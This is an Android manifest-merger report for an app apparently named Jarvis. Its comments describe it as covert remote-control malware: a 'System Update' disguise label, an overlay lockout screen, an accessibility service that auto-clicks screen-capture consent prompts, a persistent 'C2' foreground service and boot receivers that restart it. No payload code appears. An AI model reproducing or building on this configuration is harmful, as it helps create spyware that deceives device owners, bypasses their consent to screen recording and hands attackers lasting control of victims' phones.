Jarvis/app/build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.ai.assistant.jarvis"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <!-- Network -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Overlay (for "System Update" lock screen) -->
16    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
16-->src/main/AndroidManifest.xml:10:5-78
16-->src/main/AndroidManifest.xml:10:22-75
17
18    <!-- Background service -->
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
19-->src/main/AndroidManifest.xml:13:5-77
19-->src/main/AndroidManifest.xml:13:22-74
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
20-->src/main/AndroidManifest.xml:14:5-94
20-->src/main/AndroidManifest.xml:14:22-91
21    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
21-->src/main/AndroidManifest.xml:15:5-87
21-->src/main/AndroidManifest.xml:15:22-84
22
23    <!-- Boot persistence -->
24    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
24-->src/main/AndroidManifest.xml:18:5-81
24-->src/main/AndroidManifest.xml:18:22-78
25
26    <!-- Screen capture -->
27    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
27-->src/main/AndroidManifest.xml:21:5-80
27-->src/main/AndroidManifest.xml:21:22-77
28
29    <!-- Wake lock (keep CPU alive) -->
30    <uses-permission android:name="android.permission.WAKE_LOCK" />
30-->src/main/AndroidManifest.xml:24:5-68
30-->src/main/AndroidManifest.xml:24:22-65
31
32    <permission
32-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
33        android:name="com.ai.assistant.jarvis.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
33-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
34        android:protectionLevel="signature" />
34-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
35
36    <uses-permission android:name="com.ai.assistant.jarvis.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
36-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
36-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
37
38    <application
38-->src/main/AndroidManifest.xml:26:5-96:19
39        android:allowBackup="false"
39-->src/main/AndroidManifest.xml:27:9-36
40        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
40-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
41        android:extractNativeLibs="false"
42        android:icon="@mipmap/ic_launcher"
42-->src/main/AndroidManifest.xml:28:9-43
43        android:label="System Update"
43-->src/main/AndroidManifest.xml:29:9-38
44        android:roundIcon="@mipmap/ic_launcher_round"
44-->src/main/AndroidManifest.xml:30:9-54
45        android:supportsRtl="true"
45-->src/main/AndroidManifest.xml:31:9-35
46        android:theme="@style/Theme.Jarvis" >
46-->src/main/AndroidManifest.xml:32:9-44
47
48        <!-- Main activity (disguised label) -->
49        <activity
49-->src/main/AndroidManifest.xml:35:9-42:20
50            android:name="com.ai.assistant.jarvis.MainActivity"
50-->src/main/AndroidManifest.xml:36:13-41
51            android:exported="true" >
51-->src/main/AndroidManifest.xml:37:13-36
52            <intent-filter>
52-->src/main/AndroidManifest.xml:38:13-41:29
53                <action android:name="android.intent.action.MAIN" />
53-->src/main/AndroidManifest.xml:39:17-69
53-->src/main/AndroidManifest.xml:39:25-66
54
55                <category android:name="android.intent.category.LAUNCHER" />
55-->src/main/AndroidManifest.xml:40:17-77
55-->src/main/AndroidManifest.xml:40:27-74
56            </intent-filter>
57        </activity>
58
59        <!-- Accessibility service for auto-clicking MediaProjection prompts -->
60        <service
60-->src/main/AndroidManifest.xml:45:9-55:19
61            android:name="com.ai.assistant.jarvis.JarvisAccessibilityService"
61-->src/main/AndroidManifest.xml:46:13-55
62            android:exported="false"
62-->src/main/AndroidManifest.xml:48:13-37
63            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
63-->src/main/AndroidManifest.xml:47:13-79
64            <intent-filter>
64-->src/main/AndroidManifest.xml:49:13-51:29
65                <action android:name="android.accessibilityservice.AccessibilityService" />
65-->src/main/AndroidManifest.xml:50:17-92
65-->src/main/AndroidManifest.xml:50:25-89
66            </intent-filter>
67
68            <meta-data
68-->src/main/AndroidManifest.xml:52:13-54:72
69                android:name="android.accessibilityservice"
69-->src/main/AndroidManifest.xml:53:17-60
70                android:resource="@xml/accessibility_service_config" />
70-->src/main/AndroidManifest.xml:54:17-69
71        </service>
72
73        <!-- Overlay lockout service -->
74        <service
74-->src/main/AndroidManifest.xml:58:9-60:40
75            android:name="com.ai.assistant.jarvis.LockoutService"
75-->src/main/AndroidManifest.xml:59:13-43
76            android:exported="false" />
76-->src/main/AndroidManifest.xml:60:13-37
77
78        <!-- Persistent C2 foreground service -->
79        <service
79-->src/main/AndroidManifest.xml:63:9-66:56
80            android:name="com.ai.assistant.jarvis.JarvisAgentService"
80-->src/main/AndroidManifest.xml:64:13-47
81            android:exported="false"
81-->src/main/AndroidManifest.xml:65:13-37
82            android:foregroundServiceType="dataSync" />
82-->src/main/AndroidManifest.xml:66:13-53
83
84        <!-- Screen state receiver (screen on/off/unlock) -->
85        <receiver
85-->src/main/AndroidManifest.xml:69:9-77:20
86            android:name="com.ai.assistant.jarvis.ScreenStateReceiver"
86-->src/main/AndroidManifest.xml:70:13-48
87            android:exported="false" >
87-->src/main/AndroidManifest.xml:71:13-37
88            <intent-filter>
88-->src/main/AndroidManifest.xml:72:13-76:29
89                <action android:name="android.intent.action.SCREEN_OFF" />
89-->src/main/AndroidManifest.xml:73:17-75
89-->src/main/AndroidManifest.xml:73:25-72
90                <action android:name="android.intent.action.SCREEN_ON" />
90-->src/main/AndroidManifest.xml:74:17-74
90-->src/main/AndroidManifest.xml:74:25-71
91                <action android:name="android.intent.action.USER_PRESENT" />
91-->src/main/AndroidManifest.xml:75:17-77
91-->src/main/AndroidManifest.xml:75:25-74
92            </intent-filter>
93        </receiver>
94
95        <!-- Janus session polling service (used by SharingEngineJanus) -->
96        <service
96-->src/main/AndroidManifest.xml:80:9-82:40
97            android:name="com.hmdm.control.janus.JanusSessionPollService"
97-->src/main/AndroidManifest.xml:81:13-74
98            android:exported="false" />
98-->src/main/AndroidManifest.xml:82:13-37
99
100        <!-- Boot receiver — restart C2 agent after device reboot -->
101        <receiver
101-->src/main/AndroidManifest.xml:85:9-94:20
102            android:name="com.ai.assistant.jarvis.BootReceiver"
102-->src/main/AndroidManifest.xml:86:13-41
103            android:enabled="true"
103-->src/main/AndroidManifest.xml:88:13-35
104            android:exported="true" >
104-->src/main/AndroidManifest.xml:87:13-36
105            <intent-filter android:priority="999" >
105-->src/main/AndroidManifest.xml:89:13-93:29
105-->src/main/AndroidManifest.xml:89:28-50
106                <action android:name="android.intent.action.BOOT_COMPLETED" />
106-->src/main/AndroidManifest.xml:90:17-79
106-->src/main/AndroidManifest.xml:90:25-76
107                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
107-->src/main/AndroidManifest.xml:91:17-82
107-->src/main/AndroidManifest.xml:91:25-79
108
109                <category android:name="android.intent.category.DEFAULT" />
109-->src/main/AndroidManifest.xml:92:17-76
109-->src/main/AndroidManifest.xml:92:27-73
110            </intent-filter>
111        </receiver>
112
113        <provider
113-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:24:9-32:20
114            android:name="androidx.startup.InitializationProvider"
114-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:25:13-67
115            android:authorities="com.ai.assistant.jarvis.androidx-startup"
115-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:26:13-68
116            android:exported="false" >
116-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:27:13-37
117            <meta-data
117-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
118                android:name="androidx.emoji2.text.EmojiCompatInitializer"
118-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
119                android:value="androidx.startup" />
119-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
120            <meta-data
120-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:29:13-31:52
121                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
121-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:30:17-78
122                android:value="androidx.startup" />
122-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:31:17-49
123            <meta-data
123-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
124                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
124-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
125                android:value="androidx.startup" />
125-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
126        </provider>
127
128        <receiver
128-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
129            android:name="androidx.profileinstaller.ProfileInstallReceiver"
129-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
130            android:directBootAware="false"
130-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
131            android:enabled="true"
131-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
132            android:exported="true"
132-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
133            android:permission="android.permission.DUMP" >
133-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
134            <intent-filter>
134-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
135                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
135-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
135-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
136            </intent-filter>
137            <intent-filter>
137-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
138                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
138-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
138-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
139            </intent-filter>
140            <intent-filter>
140-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
141                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
141-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
141-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
142            </intent-filter>
143            <intent-filter>
143-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
144                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
144-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
144-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
145            </intent-filter>
146        </receiver>
147    </application>
148
149</manifest>